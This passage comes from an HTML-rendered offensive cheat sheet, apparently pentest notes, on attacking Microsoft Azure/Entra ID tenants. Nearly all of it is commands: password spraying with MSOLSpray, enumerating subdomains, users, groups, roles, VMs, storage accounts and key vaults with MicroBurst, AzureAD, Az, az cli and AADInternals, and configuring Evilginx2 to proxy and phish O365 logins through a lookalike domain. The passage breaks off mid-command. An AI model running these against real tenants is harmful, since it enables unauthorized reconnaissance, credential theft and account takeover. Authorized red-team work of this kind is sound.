<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Invoke-MSOLSpray</span> <span class="n">-UserList</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">validemails</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<h3 id="enumerate-azure-subdomains">Enumerate Azure Subdomains</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="p">.</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">MicroBurst</span><span class="p">\</span><span class="n">Misc</span><span class="p">\</span><span class="n">InvokeEnumerateAzureSubDomains</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Invoke-EnumerateAzureSubDomains</span> <span class="n">-Base</span> <span class="p">&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">Subdomain</span> <span class="n">Service</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="p">---------</span> <span class="p">-------</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="p">&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">mail</span><span class="p">.</span><span class="n">protection</span><span class="p">.</span><span class="n">outlook</span><span class="p">.</span><span class="n">com</span> <span class="n">Email</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="p">&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="n">Microsoft</span> <span class="n">Hosted</span> <span class="n">Domain</span>
</code></pre></div>
<h3 id="enumerate-tenant-with-azure-ad-powershell">Enumerate tenant with Azure AD Powershell</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AzureAD</span><span class="p">\</span><span class="n">AzureAD</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AzureADPreview</span><span class="p">\</span><span class="n">AzureADPreview</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;&lt;PASSWORD&gt;&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;test@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Connect-AzureAD</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADUser</span> <span class="n">-All</span> <span class="nv">$true</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADUser</span> <span class="n">-All</span> <span class="nv">$true</span> <span class="p">|</span> <span class="nb">select </span><span class="n">UserPrincipalName</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADGroup</span> <span class="n">-All</span> <span class="nv">$true</span>
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADDevice</span>
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADDirectoryRole</span> <span class="n">-Filter</span> <span class="s2">&quot;DisplayName eq &#39;Global Administrator&#39;&quot;</span> <span class="p">|</span> <span class="nb">Get-AzureADDirectoryRoleMember</span>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="nb">PS </span><span class="n">AzureADPreview</span><span class="p">&gt;</span> <span class="nb">Get-AzureADMSRoleDefinition</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IsBuiltin</span> <span class="o">-eq</span> <span class="nv">$False</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">DisplayName</span>
</code></pre></div>
<h3 id="enumerate-tenant-with-az-powershell">Enumerate tenant with Az Powershell</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;&lt;PASSWORD&gt;&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="s2">&quot;test@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Connect-AzAccount</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzResource</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzRoleAssignment</span> <span class="n">-SignInName</span> <span class="n">test</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzVM</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzWebApp</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Kind</span> <span class="o">-notmatch</span> <span class="s2">&quot;functionapp&quot;</span><span class="p">}</span>
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzFunctionApp</span>
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzStorageAccount</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzKeyVault</span>
</code></pre></div>
<h3 id="enumerate-tenant-with-az-cli">Enumerate tenant with az cli</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">login</span> <span class="n">-u</span> <span class="n">test</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">vm</span> <span class="n">list</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">vm</span> <span class="n">list</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&quot;[].[name]&quot;</span> <span class="n">-o</span> <span class="n">table</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">webapp</span> <span class="n">list</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">functionapp</span> <span class="n">list</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&quot;[].[name]&quot;</span> <span class="n">-o</span> <span class="n">table</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">storage</span> <span class="n">account</span> <span class="n">list</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">list</span>
</code></pre></div>
<h3 id="enumerate-manually">Enumerate manually</h3>
<ul>
<li>Federation with Azure AD or O365
    <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">https</span><span class="p">://</span><span class="n">login</span><span class="p">.</span><span class="n">microsoftonline</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">getuserrealm</span><span class="p">.</span><span class="n">srf</span><span class="k">?</span><span class="n">login</span><span class="p">=&lt;</span><span class="n">USER</span><span class="p">&gt;@&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;&amp;</span><span class="n">xml</span><span class="p">=</span><span class="n">1</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">https</span><span class="p">://</span><span class="n">login</span><span class="p">.</span><span class="n">microsoftonline</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">getuserrealm</span><span class="p">.</span><span class="n">srf</span><span class="k">?</span><span class="n">login</span><span class="p">=</span><span class="n">root</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span><span class="p">&amp;</span><span class="n">xml</span><span class="p">=</span><span class="n">1</span>
</code></pre></div></li>
<li>Get the Tenant ID
    <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">https</span><span class="p">://</span><span class="n">login</span><span class="p">.</span><span class="n">microsoftonline</span><span class="p">.</span><span class="n">com</span><span class="p">/&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;/.</span><span class="n">well-known</span><span class="p">/</span><span class="n">openid-configuration</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">https</span><span class="p">://</span><span class="n">login</span><span class="p">.</span><span class="n">microsoftonline</span><span class="p">.</span><span class="n">com</span><span class="p">/&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span><span class="p">/.</span><span class="n">well-known</span><span class="p">/</span><span class="n">openid-configuration</span>
</code></pre></div></li>
</ul>
<h2 id="enumeration-methodology">Enumeration methodology</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c"># Check Azure Joined </span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">dsregcmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">status</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="p">+----------------------------------------------------------------------+</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="p">|</span> <span class="n">Device</span> <span class="n">State</span> <span class="p">|</span>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="p">+----------------------------------------------------------------------+</span>
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a> <span class="n">AzureAdJoined</span> <span class="p">:</span> <span class="n">YES</span>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a> <span class="n">EnterpriseJoined</span> <span class="p">:</span> <span class="n">NO</span>
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a> <span class="n">DomainJoined</span> <span class="p">:</span> <span class="n">NO</span>
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a> <span class="n">Device</span> <span class="n">Name</span> <span class="p">:</span> <span class="n">jumpvm</span>
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="c"># Enumerate resources</span>
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzResource</span>
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="c"># Enumerate role assignments</span>
<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzRoleAssignment</span> <span class="n">-Scope</span> <span class="p">/</span><span class="n">subscriptions</span><span class="p">/&lt;</span><span class="n">SUBSCRIPTION-ID</span><span class="p">&gt;/</span><span class="n">resourceGroups</span><span class="p">/</span><span class="n">RESEARCH</span><span class="p">/</span><span class="n">providers</span><span class="p">/</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">Compute</span><span class="p">/</span><span class="n">virtualMachines</span><span class="p">/&lt;</span><span class="n">VM-NAME</span><span class="p">&gt;`</span>
<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>
<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="c"># Get info on a role</span>
<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzRoleDefinition</span> <span class="n">-Name</span> <span class="s2">&quot;Virtual Machine Command Executor&quot;</span>
<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>
<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="c"># Get info user</span>
<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADUser</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span>
<a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADUser</span> <span class="n">-ObjectId</span> <span class="n">test</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span> 
<a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>
<a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a><span class="c"># List all groups</span>
<a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADGroup</span> <span class="n">-All</span> <span class="nv">$true</span>
<a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>
<a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a><span class="c"># Get members of a group</span>
<a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzADGroup</span> <span class="n">-DisplayName</span> <span class="s1">&#39;&lt;GROUP-NAME&gt;&#39;</span>
<a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzADGroupMember</span> <span class="n">-GroupDisplayName</span> <span class="s1">&#39;&lt;GROUP-NAME&gt;&#39;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">UserPrincipalName</span>
<a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a>
<a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a><span class="c"># Get Azure AD information</span>
<a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">Get-AADIntLoginInformation</span> <span class="n">-UserName</span> <span class="n">admin</span><span class="p">@&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">Get-AADIntTenantID</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">TENANT</span> <span class="n">NAME</span><span class="p">&gt;.</span><span class="n">onmicrosoft</span><span class="p">.</span><span class="n">com</span> <span class="c"># Get Tenant ID</span>
<a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">Invoke-AADIntReconAsOutsider</span> <span class="n">-DomainName</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="c"># Get all the information</span>
<a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a>
<a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a><span class="c"># Check if there is a user logged-in to az cli</span>
<a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">ad</span> <span class="n">signed-in-user</span> <span class="n">show</span>
<a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a>
<a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a><span class="c"># Check AppID Alternative Names/Display Name </span>
<a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADServicePrincipal</span> <span class="n">-All</span> <span class="nv">$True</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">AppId</span> <span class="o">-eq</span> <span class="s2">&quot;&lt;APP-ID&gt;&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a>
<a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a>
<a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a><span class="c"># Get all application objects registered using the current tenant</span>
<a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADApplication</span> <span class="n">-All</span> <span class="nv">$true</span>
<a id="__codelineno-18-46" name="__codelineno-18-46" href="#__codelineno-18-46"></a>
<a id="__codelineno-18-47" name="__codelineno-18-47" href="#__codelineno-18-47"></a><span class="c"># Get all details about an application</span>
<a id="__codelineno-18-48" name="__codelineno-18-48" href="#__codelineno-18-48"></a><span class="nb">PS </span><span class="n">AzureAD</span><span class="p">&gt;</span> <span class="nb">Get-AzureADApplication</span> <span class="n">-ObjectId</span> <span class="p">&lt;</span><span class="n">ID</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
<a id="__codelineno-18-49" name="__codelineno-18-49" href="#__codelineno-18-49"></a>
<a id="__codelineno-18-50" name="__codelineno-18-50" href="#__codelineno-18-50"></a><span class="c"># List all VM&#39;s the user has access to</span>
<a id="__codelineno-18-51" name="__codelineno-18-51" href="#__codelineno-18-51"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzVM</span> 
<a id="__codelineno-18-52" name="__codelineno-18-52" href="#__codelineno-18-52"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzVM</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-18-53" name="__codelineno-18-53" href="#__codelineno-18-53"></a>
<a id="__codelineno-18-54" name="__codelineno-18-54" href="#__codelineno-18-54"></a><span class="c"># Get all function apps</span>
<a id="__codelineno-18-55" name="__codelineno-18-55" href="#__codelineno-18-55"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzFunctionApp</span>
<a id="__codelineno-18-56" name="__codelineno-18-56" href="#__codelineno-18-56"></a>
<a id="__codelineno-18-57" name="__codelineno-18-57" href="#__codelineno-18-57"></a><span class="c"># Get all webapps</span>
<a id="__codelineno-18-58" name="__codelineno-18-58" href="#__codelineno-18-58"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzWebApp</span>
<a id="__codelineno-18-59" name="__codelineno-18-59" href="#__codelineno-18-59"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzWebApp</span> <span class="p">|</span> <span class="nb">select-object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Type</span><span class="p">,</span> <span class="n">Hostnames</span>
<a id="__codelineno-18-60" name="__codelineno-18-60" href="#__codelineno-18-60"></a>
<a id="__codelineno-18-61" name="__codelineno-18-61" href="#__codelineno-18-61"></a><span class="c"># List all storage accounts</span>
<a id="__codelineno-18-62" name="__codelineno-18-62" href="#__codelineno-18-62"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzStorageAccount</span>
<a id="__codelineno-18-63" name="__codelineno-18-63" href="#__codelineno-18-63"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzStorageAccount</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-18-64" name="__codelineno-18-64" href="#__codelineno-18-64"></a>
<a id="__codelineno-18-65" name="__codelineno-18-65" href="#__codelineno-18-65"></a><span class="c"># List all keyvaults</span>
<a id="__codelineno-18-66" name="__codelineno-18-66" href="#__codelineno-18-66"></a><span class="nb">PS </span><span class="n">Az</span><span class="p">&gt;</span> <span class="nb">Get-AzKeyVault</span>
</code></pre></div>
<h2 id="phishing-with-evilginx2">Phishing with Evilginx2</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="n">evilginx2</span> <span class="n">-p</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">evilginx2</span><span class="p">\</span><span class="n">phishlets</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="p">:</span> <span class="n">config</span> <span class="n">domain</span> <span class="n">username</span><span class="p">.</span><span class="n">corp</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="p">:</span> <span class="n">config</span> <span class="n">ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="p">:</span> <span class="n">phishlets</span> <span class="n">hostname</span> <span class="n">o365</span> <span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="p">:</span> <span class="n">phishlets</span> <span class="nb">get-hosts</span> <span class="n">o365</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="n">Create</span> <span class="n">a</span> <span class="n">DNS</span> <span class="n">entry</span> <span class="k">for</span> <span class="n">login</span><span class="p">.</span><span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span> <span class="n">and</span> <span class="n">www</span><span class="p">.</span><span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span><span class="p">,</span> <span class="nb">type </span><span class="n">A</span><span class="p">,</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">your</span> <span class="n">machine</span>
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c"># copy certificate and enable the phishing</span>
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Copy-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">ca</span><span class="p">.</span><span class="n">crt</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span><span class="p">\</span><span class="n">o365</span><span class="p">.</span><span class="n">crt</span>
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Copy-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">private</span><span class="p">.</span><span class="n">key</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span><span class="p">\</span><span class="n">o365</span><span class="p">.</span><span 